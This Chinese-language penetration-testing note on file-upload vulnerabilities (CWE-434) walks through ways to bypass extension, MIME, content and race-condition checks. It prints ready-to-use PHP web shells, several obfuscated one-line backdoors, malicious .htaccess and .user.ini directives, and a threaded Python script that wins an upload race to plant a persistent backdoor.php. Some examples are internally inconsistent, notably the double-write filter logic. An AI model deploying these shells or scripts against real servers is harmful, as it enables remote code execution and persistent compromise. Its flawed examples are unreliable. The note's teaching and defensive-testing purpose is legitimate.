# 第八天 - 文件上传

> 文件上传漏洞属于 CWE-434: Unrestricted Upload of Dangerous File Type。攻击者上传可执行文件（PHP、JSP、ASP、Python 脚本等）到服务器，如果能控制上传路径且文件可以被 Web 容器解析，则实现远程代码执行（RCE）。

## 成功的三个条件

```
1. 绕过限制，成功将文件上传到服务器
2. 知道上传文件的存放路径
3. 上传的文件可以被 Web 容器解析执行
```

三个条件缺一不可。

---

## 一、防御层与绕过技术一览

```text
客户端 JavaScript 限制                  →  Burp 直接修改请求
    │
服务端 Content-Type 检查               →  修改 MIME 字段
    │
服务端扩展名黑名单                      →  多重扩展、大小写、特殊字符截断
    │
服务端扩展名白名单                      →  配置文件上传 (.htaccess / .user.ini)
    │
服务端文件内容检查 (Magic Bytes)        →  GIF89a 伪造文件头
    │
服务端文件内容检查 (完整检测)            →  二次渲染 / 图片元数据插入
    │
服务端文件内容检查 (危险函数)            →  script 标签替代 <?php
    │
检查后删除 (Race Condition)             →  时间竞争利用
```

---

## 二、前端绕过 (Client-side Bypass)

**原理**：前端 JavaScript 检查文件扩展名，只允许指定类型提交。

**绕过**：Burp 拦截请求，修改文件名和 Content-Type。

```text
原始请求: filename="shell.php"
Burp 中改为 -> filename="shell.jpg"  (绕过前端)
       然后再改为 -> filename="shell.php"  (提交到后端)
```

**注意**：前端检查无安全价值，只能减少无效请求流量。

---

## 三、MIME 类型绕过

**原理**：服务端检查 HTTP 请求中 `Content-Type` 字段。

**绕过**：Burp 中修改 `Content-Type: application/x-php` 为 `Content-Type: image/jpeg`。

**为什么有效**：PHP 的 `$_FILES['file']['type']` 直接取自 HTTP 包头，不验证文件实际内容，完全由客户端控制。

---

## 四、扩展名黑名单绕过

服务端维护禁止上传的扩展名列表（`.php`、`.asp`、`.jsp` 等），匹配则拒绝。

### 4.1 多重扩展名

```text
shell.php.jpg  →  按最后一个扩展名判断为图片
```

实际需要配合 Apache 的 `AddHandler` 配置不当才有效，不是通用绕过。

### 4.2 大小写绕过

```text
shell.php    →  被黑名单拦截（匹配 "php"）
shell.PhP    →  黑名单只写小写 "php"，未做大小写归一化则绕过
shell.pHp    →  同理

注意：Windows 文件系统不区分大小写，但黑名单匹配逻辑不区分大小写时依然能拦截。
```

### 4.3 点绕过 / 点空额点绕过

```text
Windows NTFS 文件系统特性：文件名末尾的 . 和 空格会被自动删除

shell.php.     →  保存后自动变为 shell.php
shell.php. .   →  保存后自动变为 shell.php
shell.php.     →  上传时文件名 "shell.php."，保存后尾部点被去掉

仅 Windows 有效。Linux 不会自动截断尾部 . 和空格。
```

### 4.4 超长文件名截断

```text
Windows 路径限制：NTFS 最大路径 255 个字符

shell.php + (大量重复字符 AAAA...) + .jpg
超出限制的部分被静默截断，保留 shell.php

例如: shell.phpAAAA...(250个A)...AAAA.jpg  →  截断后为 shell.php...
```

### 4.5 Windows ADS 备用数据流

```text
shell.php::$DATA  →  NTFS 备用数据流标记
PHP 处理时 ::$DATA 被忽略，最终文件为 shell.php
```

### 4.6 空字节截断

```text
shell.php%00.jpg  →  C 层处理路径时空字节截断，变为 shell.php

PHP 5.3.4 后修复，不再截断 null byte。
```

### 4.7 双写绕过

专门针对**黑名单中过滤关键字后做不严谨的替换**：

```php
// 如果后端代码是：
if (str_ireplace('php', '', $filename) != $filename) → 拒绝

// 输入:
shell.pphphp
// 替换后: 中间的 "php" 被替换掉，"pphphp" 去掉 "php" 变成 "php"
// 实际文件: shell.php
```

> 完整 bypass wordlist 见：[[../../../wordlists/upload-extension-blacklist-bypass.txt]]

## 五、配置文件上传绕过

当扩展名白名单（只允许 `.jpg` `.png` `.gif`）时，无法直接上传 `.php`。此时可上传配置文件间接控制解析行为。

### 5.1 .htaccess (Apache)

```apache
# 将 .jpg 文件当作 PHP 解析
AddType application/x-httpd-php .jpg

# 或者指定文件用 PHP 解析
<FilesMatch "shell.jpg">
  SetHandler application/x-httpd-php
</FilesMatch>
```

**前提**：
- Apache 服务器
- AllowOverride 允许 .htaccess
- .htaccess 可上传（常被加入黑名单）

绕过 .htaccess 黑名单：`.Htaccess`（大小写）、`.htaccess.`（Windows 尾部点）。

### 5.2 .user.ini (PHP)

```ini
auto_prepend_file = shell.jpg
auto_append_file = shell.jpg
```

**工作原理**：在所有 PHP 脚本执行前/后自动 include 指定文件。上传含 PHP 代码的 `.jpg` + `.user.ini`，访问任意 PHP 页面即可触发。

**前提**：
- PHP 以 CGI/FastCGI/FPM 运行（非 mod_php）
- `.user.ini` 可上传
- PHP 7.0+ 仍支持

### 5.3 web.config (IIS/ASP.NET)

```xml
<configuration>
  <system.webServer>
    <handlers>
      <add name="PHP" path="*.jpg" verb="*" modules="FastCgiModule" 
           resourceType="File" requireAccess="Script" />
    </handlers>
  </system.webServer>
</configuration>
```

## 六、文件内容检查绕过

### 6.1 Magic Bytes 绕过

在文件头部添加图片文件头字节：

```text
GIF89a = 47 49 46 38 39 61  →  GIF
\xFF\xD8\xFF\xE0            →  JPEG
\x89PNG                      →  PNG
```

```php
GIF89a
<?php system($_GET['cmd']); ?>
```

许多检查只读取文件前几个字节，看到 GIF89a 即认为是图片。

### 6.2 `<script language="php">` 绕过

检查匹配 `<?php` 时可用 PHP 替代标签：

```php
<script language="php">system($_GET['cmd']);</script>
```

**重要限制**：PHP 7.0 后移除了此标签支持，**仅 PHP < 7.0 有效**。

### 6.3 图片二次渲染绕过

当服务端用 `imagecreatefromjpeg()` 等函数对图片重新采样生成新图片时，嵌入的后门可能被去除。

**步骤**：

```
1. 上传原图
2. 下载渲染后的图片
3. 用 Beyond Compare / 010 Editor 比较原图和渲染图
4. 找到完全相同的字节区域（二次渲染未修改的部分）
5. 在该区域插入一句话木马
6. 再次上传验证后门存活
```

### 6.4 EXIF 元数据插入

```bash
exiftool -Comment='<?php system($_GET["cmd"]); ?>' image.jpg
```

生成的图片仍是合法 JPEG，`getimagesize()` 通过。通常配合 LFI 执行。

## 七、条件竞争绕过 (Race Condition)

### 原理

服务端逻辑顺序：

```text
[1] 保存文件到临时目录 → [2] 检查是否危险 → [3] 危险则删除
                         ↑  时间窗口  ↑
```

在保存到删除之间，文件短暂存在于磁盘上。

### 攻击方法

```python
import threading
import requests

target = "http://target.com/upload.php"
shell_url = "http://target.com/uploads/shell.php"

def uploader():
    while True:
        files = {"file": ("shell.php", "<?php file_put_contents('backdoor.php','<?php system($_GET[1]);?>');?>")}
        requests.post(target, files=files)

def accessor():
    while True:
        r = requests.get(shell_url)
        if r.status_code == 200:
            print("Webshell created!")
            break

t1 = threading.Thread(target=uploader)
t2 = threading.Thread(target=accessor)
t1.start()
t2.start()
```

**关键**：上传请求持续上传恶意文件，访问请求持续尝试访问该文件。命中时间窗口，shell.php 被执行并创建永久的 backdoor.php。

**大文件优势**：文件越大写入耗时越长，时间窗口越明显。

## 八、一句话木马变形

如果黑名单含 `eval` `system` `exec` `assert` `$_GET` `$_POST` 等关键字：

```php
// 最基础
<?php eval($_POST[1]);?>

// 字符串拼接绕过关键字
<?php ${"$_s"."ESSION"}['test'] = $_GET['cmd'];?>

// base64 编码
<?php eval(base64_decode('ZWNobyAnSGVsbG8nOw=='));?>

// 变量函数
<?php $a = "system"; $a($_GET['cmd']);?>

// 回调函数
<?php array_map(function($v){system($v);}, [$_GET['cmd']]);?>

// 反引号执行
<?php $cmd = $_GET['cmd']; echo `$cmd`;?>

// 变量函数方式（精简）
<?=$_POST[1]($_POST[2]);?>
```

## 九、常见组合链

| 组合 | 说明 |
|------|------|
| 上传 + LFI | 上传图片马，通过 LFI include 执行。最常见的长尾组合 |
| 上传 + SQLi | 上传 Webshell 后读数据库，或 SQL 写 Webshell（INTO OUTFILE） |

第七天（文件包含）+ 第八天（文件上传）是自然搭档。

## 附：Apache解析特性

### 多后缀解析（配置相关）

如果一个文件有多个后缀，如 `shell.php.rar`，Apache 的处理逻辑是：

```
文件名: shell.php.rar
         ↑     ↑
         |     └─ .rar  → Apache 不认识这个类型
         |
         └─ .php  → 有对应的 handler → 按 PHP 解析
```

结果：`shell.php.rar` 被当作 PHP 执行。

前提是 Apache 用了 `AddHandler` 而非 `SetHandler`/`FilesMatch` 配置。

### CVE-2017-15715（换行解析漏洞）

Apache 2.4.0~2.4.29 的 `mod_mime` 缺陷：

后端黑名单检查时，看到的文件名是 `shell.php\n`（末尾多了换行符），黑名单规则匹配不到 `.php`，检查通过。但 Apache 实际处理这个文件时，自动忽略换行符，还是按 `.php` 后缀命中 handler → 按 PHP 解析。

**利用方法** — Burp 中修改文件名，在 `shell.php` 后加一个 `\x0a`（换行符的十六进制）：

```http
Content-Disposition: form-data; name="file"; filename="shell.php\n"
```

PHP 的 `$_FILES['file']['name']` 收到 `shell.php\n`，比黑名单检查的 `php` 多了一个字符，strpos/strrchr 都不会匹配到纯 `php`，绕过成功。Apache 2.4.30+ 已修复。

## 十、常见误解

- `.php.jpg` 默认不被 Apache 当 PHP 执行，除非有 `AddHandler` 配置。
- `Content-Type` 来自客户端，不可信。真正的图片检查要验证文件内容。
- `GIF89a` 只验证了前 6 字节，后续可以跟任意 PHP 代码。
- 尾部点和空格截断是 Windows NTFS 特性，Linux 上无效。
- 大文件的条件竞争时间窗口更大，不需要极高频率也能命中。
